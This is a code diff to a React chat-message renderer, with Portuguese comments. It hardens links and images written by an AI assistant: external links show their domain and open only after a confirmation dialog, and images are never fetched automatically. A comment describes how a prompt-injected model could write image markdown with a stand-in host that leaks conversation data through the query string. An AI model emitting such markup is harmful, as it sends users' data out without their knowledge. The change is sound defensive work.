@@ -1,8 +1,81 @@
+import { ExternalLink } from "lucide-react"
+import { type ReactNode, useState } from "react"
 import type { Components } from "react-markdown"
 import ReactMarkdown from "react-markdown"
 import remarkBreaks from "remark-breaks"
 import remarkGfm from "remark-gfm"
+import {
+	AlertDialog,
+	AlertDialogAction,
+	AlertDialogCancel,
+	AlertDialogContent,
+	AlertDialogDescription,
+	AlertDialogFooter,
+	AlertDialogHeader,
+	AlertDialogTitle,
+	AlertDialogTrigger,
+} from "@/components/ui/alert-dialog"
+import { classifyChatLink, shownUrl } from "@/lib/chat-links"
 import { cn } from "@/lib/cn"
+
+const LINK_CLASS = "underline opacity-80 hover:opacity-100"
+
+function currentOrigin(): string | undefined {
+	return typeof window === "undefined" ? undefined : window.location.origin
+}
+
+/**
+ * Link escrito pelo modelo. Interno (o próprio sisub) abre normal. Externo mostra o domínio ao
+ * lado do texto e só abre depois de confirmar, num aviso com o endereço completo: o texto do
+ * link é do modelo e pode mentir, e a query string pode levar o que a conversa leu. Sem `href`
+ * no DOM, de propósito: clique do meio e "abrir em nova aba" pulariam a confirmação.
+ */
+function ChatLink({ href, children }: { href: unknown; children: ReactNode }) {
+	const [open, setOpen] = useState(false)
+	const target = classifyChatLink(href, currentOrigin())
+
+	if (target.kind === "blocked") return <span>{children}</span>
+	if (target.kind === "internal") {
+		return (
+			<a href={target.href} target="_blank" rel="noopener noreferrer nofollow" className={LINK_CLASS}>
+				{children}
+			</a>
+		)
+	}
+
+	return (
+		<AlertDialog open={open} onOpenChange={setOpen}>
+			<AlertDialogTrigger render={<button type="button" className={cn(LINK_CLASS, "inline cursor-pointer text-left")} />}>
+				{children}
+				<span className="ml-1 inline-flex items-center gap-0.5 text-xs no-underline opacity-70">
+					<ExternalLink aria-hidden className="size-3" />
+					{target.host}
+				</span>
+			</AlertDialogTrigger>
+			<AlertDialogContent>
+				<AlertDialogHeader>
+					<AlertDialogTitle>Abrir link externo?</AlertDialogTitle>
+					<AlertDialogDescription>
+						O link sai do sisub e leva para <strong className="text-foreground">{target.host}</strong>. Ele foi escrito pelo assistente; abra só se reconhecer o
+						endereço.
+					</AlertDialogDescription>
+				</AlertDialogHeader>
+				<code className="block max-h-32 overflow-auto rounded-md bg-muted p-2 font-mono text-xs break-all">{shownUrl(target.href)}</code>
+				<AlertDialogFooter>
+					<AlertDialogCancel>Cancelar</AlertDialogCancel>
+					<AlertDialogAction
+						onClick={() => {
+							setOpen(false)
+							window.open(target.href, "_blank", "noopener,noreferrer")
+						}}
+					>
+						Abrir
+					</AlertDialogAction>
+				</AlertDialogFooter>
+			</AlertDialogContent>
+		</AlertDialog>
+	)
+}
 
 // Stable references outside — React Compiler won't hoist these automatically
 // since they're object/array literals; keeping them module-level prevents
@@ -26,24 +99,17 @@ const components: Partial<Components> = {
 		return <code className="rounded bg-black/10 px-1 py-0.5 font-mono text-xs">{children}</code>
 	},
 
-	a: ({ href, children }) => (
-		<a href={href} target="_blank" rel="noopener noreferrer nofollow" className="underline opacity-80 hover:opacity-100">
-			{children}
-		</a>
-	),
+	a: ({ href, children }) => <ChatLink href={href}>{children}</ChatLink>,
 
 	// Imagem NUNCA é buscada. O texto aqui vem de um modelo, e um modelo sob prompt injection
 	// (texto plantado numa receita, num nome de template) escreve `![](https://x/?d=<dados>)`:
 	// o navegador faria o GET sozinho, sem clique, levando na query string o que a conversa
-	// tiver lido. Vira link com o texto alternativo — sair do app passa a exigir um clique.
+	// tiver lido. Vira link com o texto alternativo, pela mesma regra dos links: externo mostra o
+	// domínio e pede confirmação.
 	img: ({ src, alt }) => {
 		const label = alt?.trim() ? `imagem: ${alt.trim()}` : "imagem"
 		if (typeof src !== "string" || !/^https?:\/\//i.test(src)) return <span className="opacity-70">[{label}]</span>
-		return (
-			<a href={src} target="_blank" rel="noopener noreferrer nofollow" className="underline opacity-80 hover:opacity-100">
-				[{label}]
-			</a>
-		)
+		return <ChatLink href={src}>[{label}]</ChatLink>
 	},
 
 	ul: ({ children }) => <ul className="mb-1 list-disc pl-5 last:mb-0">{children}</ul>,
